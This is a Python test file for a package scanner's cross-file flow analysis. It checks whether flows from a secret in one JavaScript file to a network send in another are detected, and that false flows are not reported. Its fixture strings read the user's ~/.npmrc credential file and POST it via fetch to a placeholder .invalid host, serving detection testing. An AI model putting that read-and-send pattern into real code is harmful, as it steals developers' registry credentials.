"""Cross-file flow from per-file summaries (programme 3C, release item 60, notes/60-cross-file-flow.md):
a value read in one of a package's files and sent by a helper another file exports is one flow, at the
caller's line, joined from facts alone.

Fixtures name hosts under `.invalid`; nothing in them is run.
"""

from __future__ import annotations

from typing import ClassVar

from cordon_scanner.analysis.javascript.flow.summaries import CrossFile, JsSummaries


class CrossKit:
    READ: ClassVar[str] = (
        'const fs = require("fs");\n'
        'const secret = fs.readFileSync(require("os").homedir() + "/.npmrc");\n'
    )
    SENDER: ClassVar[str] = (
        "module.exports.send = function (d) {\n"
        '  return fetch("https://a.invalid/u", { method: "POST", body: d });\n'
        "};\n"
    )

    @staticmethod
    def flows(files: dict[str, str]) -> list[tuple[str, int, frozenset[str], str, str]]:
        facts = {path: JsSummaries.of(text) for path, text in files.items()}
        return CrossFile.compose(facts, frozenset(files))

    @staticmethod
    def sends_from(files: dict[str, str], path: str) -> bool:
        return any(
            f[0] == path and f[3] == "request" and "secret_file" in f[2]
            for f in CrossKit.flows(files)
        )


class TestAHelperInAnotherFile:
    def test_a_source_passed_to_a_helper_that_sends_it(self) -> None:
        files = {
            "package/a.js": CrossKit.READ + 'const h = require("./h");\nh.send(secret);\n',
            "package/h.js": CrossKit.SENDER,
        }
        flows = CrossKit.flows(files)
        assert ("package/a.js", 4) in {(f[0], f[1]) for f in flows}
        assert CrossKit.sends_from(files, "package/a.js")

    def test_a_destructured_helper(self) -> None:
        files = {
            "package/a.js": CrossKit.READ + 'const { send } = require("./h");\nsend(secret);\n',
            "package/h.js": CrossKit.SENDER,
        }
        assert CrossKit.sends_from(files, "package/a.js")

    def test_a_helper_that_returns_a_source_the_caller_sends(self) -> None:
        files = {
            "package/a.js": (
                'const h = require("./lib/read");\nconst d = h.read();\n'
                'fetch("https://a.invalid/u", { method: "POST", body: d });\n'
            ),
            "package/lib/read.js": CrossKit.READ
            + "exports.read = function () { return secret; };\n",
        }
        assert CrossKit.sends_from(files, "package/a.js")

    def test_three_files_deep(self) -> None:
        files = {
            "package/a.js": CrossKit.READ + 'const b = require("./b");\nb.relay(secret);\n',
            "package/b.js": 'const c = require("./c");\nexports.relay = function (x) { c.send(x); };\n',
            "package/c.js": CrossKit.SENDER,
        }
        assert CrossKit.sends_from(files, "package/a.js")

    def test_through_a_reexport(self) -> None:
        files = {
            "package/a.js": CrossKit.READ + 'const b = require("./b");\nb.send(secret);\n',
            "package/b.js": 'module.exports = require("./c");\n',
            "package/c.js": CrossKit.SENDER,
        }
        assert CrossKit.sends_from(files, "package/a.js")


class TestNoFlowIsInvented:
    def test_a_helper_whose_parameter_only_reaches_its_return_unused(self) -> None:
        files = {
            "package/a.js": CrossKit.READ + 'const h = require("./h");\nh.id(secret);\n',
            "package/h.js": "exports.id = function (d) { return d; };\n",
        }
        assert not CrossKit.sends_from(files, "package/a.js")

    def test_a_dynamic_require_is_no_edge(self) -> None:
        files = {
            "package/a.js": CrossKit.READ
            + 'const n = "./h";\nconst h = require(n);\nh.send(secret);\n',
            "package/h.js": CrossKit.SENDER,
        }
        assert not CrossKit.sends_from(files, "package/a.js")

    def test_a_module_outside_the_tree_is_no_edge(self) -> None:
        files = {"package/a.js": CrossKit.READ + 'const h = require("./h");\nh.send(secret);\n'}
        assert not CrossKit.sends_from(files, "package/a.js")

    def test_another_export_of_the_helper(self) -> None:
        files = {
            "package/a.js": CrossKit.READ + 'const h = require("./h");\nh.log(secret);\n',
            "package/h.js": CrossKit.SENDER
            + "module.exports.log = function (d) { console.log(1); };\n",
        }
        assert not CrossKit.sends_from(files, "package/a.js")


class TestTheFactsAreBounded:
    def test_every_label_is_from_the_declared_vocabulary(self) -> None:
        facts = JsSummaries.of(CrossKit.READ + 'const h = require("./h");\nh.send(secret, 1);\n')
        for _module, _name, _i, labels, _line, _caller, cid in facts["js.callout"]:
            assert len(labels) <= JsSummaries.MAX_LABELS
            assert all(lab.startswith(("P", "C")) or lab.isidentifier() for lab in labels)
            assert cid.startswith("C")

    def test_no_raw_destination_crosses(self) -> None:
        facts = JsSummaries.of(CrossKit.SENDER)
        for _name, _frm, to in facts["js.summary"]:
            if to.startswith("sink:"):
                assert to.rsplit(":", 1)[-1] in ("drop", "ip", "fixed", "unknown")
